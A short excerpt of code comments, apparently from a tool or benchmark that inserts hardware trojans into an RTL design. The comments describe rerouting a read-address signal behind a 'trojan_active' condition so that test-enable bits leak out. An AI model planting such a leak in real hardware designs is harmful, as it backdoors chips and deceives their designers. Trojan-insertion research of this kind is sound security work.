 ...
 * Payload: Route raddr_i[0] to observable output
 * 
...
//   Find the assign for raddr_i (or rd_error_o as fallback):
//     assign raddr_i = <normal_expr>;
//   Replace with:
//     assign raddr_i = trojan_active ? test_en_i[leak_bit_idx] : (<normal_expr>);
//
